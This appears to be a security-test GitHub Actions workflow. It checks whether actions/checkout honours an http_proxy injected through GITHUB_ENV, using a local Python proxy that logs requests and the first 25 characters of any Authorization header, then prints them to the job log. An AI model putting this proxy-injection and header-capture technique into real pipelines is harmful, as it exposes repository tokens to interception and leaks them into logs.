name: actions/checkout MITM test
on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  checkout-mitm:
    runs-on: ubuntu-latest
    steps:
      - name: Start proxy and inject http_proxy
        run: |
          cat > /tmp/proxy.py << 'PYEOF'
          import http.server, socketserver, json
          class Handler(http.server.BaseHTTPRequestHandler):
              def handle_one(self):
                  with open('/tmp/checkout_capture.jsonl', 'a') as f:
                      entry = {
                          "method": self.command,
                          "path": self.path,
                          "host": self.headers.get("Host",""),
                      }
                      auth = self.headers.get("Authorization","")
                      if auth:
                          entry["auth_prefix"] = auth[:25]
                          entry["auth_len"] = len(auth)
                      f.write(json.dumps(entry) + "\n")
                  self.send_response(502)
                  self.end_headers()
                  self.wfile.write(b"intercepted")
              def do_GET(self): self.handle_one()
              def do_POST(self): self.handle_one()
              def do_CONNECT(self):
                  with open('/tmp/checkout_capture.jsonl', 'a') as f:
                      f.write(json.dumps({"method":"CONNECT","target":self.path}) + "\n")
                  self.send_response(502)
                  self.end_headers()
              def log_message(self, *a): pass
          with socketserver.TCPServer(("127.0.0.1", 18080), Handler) as s:
              s.timeout = 30
              for _ in range(20):
                  s.handle_request()
          PYEOF
          python3 /tmp/proxy.py &
          sleep 1
          ss -tlnp | grep 18080
          echo "http_proxy=http://127.0.0.1:18080" >> $GITHUB_ENV
          echo "Proxy injected"

      - name: actions/checkout (will it use the proxy?)
        uses: actions/checkout@v4
        continue-on-error: true
        with:
          fetch-depth: 1

      - name: Check what the proxy captured from checkout
        run: |
          unset http_proxy https_proxy
          echo "=== PROXY CAPTURE LOG ==="
          if [ -f /tmp/checkout_capture.jsonl ]; then
            cat /tmp/checkout_capture.jsonl
            echo ""
            echo "=== Auth headers captured ==="
            python3 -c "
import json
with open('/tmp/checkout_capture.jsonl') as f:
    for line in f:
        d = json.loads(line)
        if d.get('auth_prefix'):
            print(f'CAPTURED: {d[\"method\"]} {d[\"path\"]} auth={d[\"auth_prefix\"]}... ({d[\"auth_len\"]} chars)')
" 2>/dev/null
          else
            echo "No captures from actions/checkout"
          fi
